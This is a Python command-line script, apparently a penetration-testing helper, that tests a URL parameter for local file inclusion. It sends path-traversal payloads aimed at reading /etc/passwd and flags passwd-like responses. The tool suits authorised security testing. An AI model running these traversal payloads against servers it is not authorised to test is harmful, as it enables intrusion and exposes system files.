#!/usr/bin/env python3
"""
lfi_checker.py - Lightweight LFI detection helper

Usage examples:
  python3 scripts/exploitation/lfi_checker.py "http://example.com/vuln.php?page={FUZZ}"
  python3 scripts/exploitation/lfi_checker.py --param page --url "http://example.com/vuln.php" --path "/etc/passwd"

Notes:
- Uses requests if available; falls back to urllib
- Non-destructive checks, prints heuristics
"""
from __future__ import annotations
import argparse
import sys
import urllib.parse
import urllib.request
from typing import List

GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
RED = "\033[1;31m"
NC = "\033[0m"


try:
    import requests
    HAS_REQUESTS = True
except Exception:
    HAS_REQUESTS = False


def fetch(url: str, timeout=8) -> tuple[int, str]:
    try:
        if HAS_REQUESTS:
            r = requests.get(url, timeout=timeout, allow_redirects=True)
            return r.status_code, r.text[:20000]
        else:
            with urllib.request.urlopen(url, timeout=timeout) as r:
                data = r.read(20000)
                return r.getcode(), data.decode(errors='replace')
    except Exception as e:
        return 0, str(e)


PAYLOADS = [
    "/etc/passwd",
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
]


def main() -> int:
    p = argparse.ArgumentParser(description="Lightweight LFI checker")
    p.add_argument("--url", help='Full URL with query (e.g. "http://a/?page=1")')
    p.add_argument("--template", help='URL with {FUZZ} placeholder (e.g. "http://a/?page={FUZZ}")')
    p.add_argument("--param", help='Parameter name to test (e.g. page)')
    p.add_argument("--path", default="/etc/passwd", help='Path to attempt (default: /etc/passwd)')
    args = p.parse_args()

    if not args.url and not args.template:
        if not args.param or not args.url:
            print(f"{RED}[!] Provide either --template or both --url and --param{NC}")
            return 2

    targets: List[str] = []
    if args.template:
        targets.append(args.template)
    else:
        # build template from url and param
        parsed = urllib.parse.urlparse(args.url)
        qs = dict(urllib.parse.parse_qsl(parsed.query))
        if args.param not in qs:
            qs[args.param] = "{FUZZ}"
        else:
            qs[args.param] = "{FUZZ}"
        new_qs = urllib.parse.urlencode(qs)
        rebuilt = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_qs, parsed.fragment))
        targets.append(rebuilt)

    print(f"{YELLOW}Using requests:{NC} {HAS_REQUESTS}")
    for t in targets:
        for payload in PAYLOADS + [args.path]:
            url = t.replace('{FUZZ}', urllib.parse.quote(payload, safe=''))
            code, body = fetch(url)
            if code == 0:
                print(f"{RED}[!] Error fetching {url}:{NC} {body}")
                continue

            hints = []
            if 'root:x:0:0:' in body or 'root:' in body and 'nologin' in body:
                hints.append('passwd-like')
            if 'No such file or directory' in body:
                hints.append('file-not-found')
            if len(body) > 1000:
                hints.append('large-response')

            if hints:
                print(f"{GREEN}[+] Potential LFI at:{NC} {url}")
                print(f"   {YELLOW}Status:{NC} {code} {YELLOW}Hints:{NC} {', '.join(hints)}")
            else:
                print(f"{RED}[-] No obvious LFI for {url}{NC}")

    return 0


if __name__ == '__main__':
    sys.exit(main())
